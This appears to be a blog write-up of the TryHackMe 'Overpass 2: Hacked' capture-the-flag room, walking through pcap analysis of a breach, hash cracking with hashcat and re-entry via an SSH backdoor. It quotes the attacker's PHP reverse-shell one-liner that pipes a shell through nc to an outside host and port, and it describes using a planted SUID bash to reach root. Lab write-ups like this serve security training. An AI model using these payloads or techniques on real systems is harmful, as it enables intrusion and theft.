---
title: THM | Overpass 2
image: /images/op2-home.png
date: 2020-09-26 17:00:00 -4:00
categories: [CTF, THM]
tags: [wireshark, pcap, hashcat, backdoor, go, salt, hash] 

---

# Description 
> [Overpass 2: Hacked](https://tryhackme.com/room/overpass2hacked), is an easy-rated box on [TryHackMe](https://tryhackme.com/) that has you analyze a pcap file of the network activity that occurred during the time of a breach. You then retrace the attackers steps to regain access to the server.

# `[Task 1]` Forensics - Analyze the PCAP

## `1.1` - What was the URL of the page they used to upload a reverse shell?
There's many ways to filter down the traffic you're looking for. One of the first things I do when analyzing a pcap file in wireshark is to take a look at the export objects. You can get some easy wins this way.

![](/images/op2-exp-obj.png)

![](/images/op2-obj-list.png)
`upload.php` seems like a winner. When you select it in the export list window, it will highlight the packet in wireshark. From there you can just `follow tcp stream` to analyze further.

![](/images/op2-fol-tcp-str.png)
Right away the stream reveals a lot of good info. ez.
![](/images/op2-development.png)
The very first thing shown is the `POST` request made to upload the file we discovered earlier, `upload.php` as well as the `Referer` giving us the first answer. **`/development/`**

## `1.2` - What payload did the attacker use to gain access?
Scrolling down a bit shows the content of the `POST` request and the file `payload.php` with a very common php shell code. 

```php
<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```
![](/images/op2-payload.png)

## `1.3` - What password did the attacker use to privesc?
Since we know the payload used `nc 192.168.170.145 4242` to make the call back to the attacker, we can use this to filter the pcap file. Using the display filter `ip.addr == 192.168.170.145 and tcp.port == 4242`. 

![](/images/op2-dis-filter.png)

Again, choose any packet and follow the tcp stream. You will see a plethora of information, and as great as `nc` is, it is a very bad choice for keeping your traffic confidential. Everything the attacker did on the server is in clear text for us to analyze.

![](/images/op2-password.png)
> All of the red text is the server and everything in blue is the user's input.

There's the password we're looking for: `whenevernoteartinstant`

## `1.4` - How did the attacker establish persistence?
Scrolling down the same stream, you will see the attacker download a ssh backdoor from [`https://github.com/NinjaJc01/ssh-backdoor`](https://github.com/NinjaJc01/ssh-backdoor) to access the server at a later time.
![](/images/op2-backdoor.png)

## `1.5` - Using the fasttrack wordlist, how many of the system passwords were crackable?
The attacker cat'd the `/etc/shadow` file, copy the hashes and put them into a text file.
![](/images/op2-shadow.png)
### Hashcat
Now use hashcat to crack the hashes. 
![](/images/op2-hashcat.png)

# `[Task 2]` Research - Analyze the code
## `2.1` What's the default hash for the backdoor?
You can either download the repo of the ssh backdoor or just analyze it from github in your browser. It doesn't matter, everything we need is in the `main.go` file. 

Looking over the code you will find a hardcoded hash assigned to a variable.
![](/images/op2-hash.png)

## `2.2` What's the hardcoded salt for the backdoor?
Again going through the same source code, you will find a function called passwordHandler and the hardcoded salt used for the hash.
![](/images/op2-salt.png)

## `2.3` What was the hash that the attacker used? - go back to the PCAP for this!
Going through the tcp stream from earlier, you can clearly see the hash the attacker used with the backdoor.
![](/images/op2-att-hash.png)

## `2.4` Crack the hash using rockyou and a cracking tool of your choice. What's the password?

So there's a few things to hit on real quick:

- When analyzing the source code for the backdoor, we found the hardcoded salt used to hash the password mentioned in `2.2`.
- Also important, is the algorithm used to calculate the hash. Which can also be found in the source code.
```go
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```
- So it's using sha512 to hash the password + salt. 
- Great, now we can start putting together our hashcat command.

Using the [hashcat example hashes menu](https://hashcat.net/wiki/doku.php?id=example_hashes), you will find option `1710` matches our scenario in the form of `sha512($pass.$salt)`

So our command will be in form of `hashcat -m <HASH_TYPE> -a 0 -o <outfile> <HASH:SALT> <wordlist>`
![](/images/op2-hc.png)

cat the output file to reveal the password.
![](/images/op2-hc2.png)

# `[Task 3]` Attack - Get back in!
## `3.1` The attacker defaced the website. What message did they leave as a heading?
Deploy the machine and head over to the website. You will immediately see the defacement. 
![](/images/op2-web.png)

## `3.2` Using the information you've found previously, hack your way back in!
If you have a good memory and are observant, you will remember from the pcap file and the source code, that the `ssh backdoor` is listening on `port 2222`. So simply connect with ssh on that port.
![](/images/op2-ssh.png)

## `3.3` What's the user flag?
Simple enough, just go to james' home directory and cat the user.txt file.
![](/images/op2-user.png)

## `3.4` What's the root flag?
If you did a `ls -la` in james' home directory then you would of seen a hidden binary named `.suid_bash` with the sticky bit set. Seems like a quick way for the attacker to escalate to root, so let's try it out ourselves. 
![](/images/op2-root.png)

Boom, just like that we got root and we can get the last flag.

![](/images/op2-root2.png)
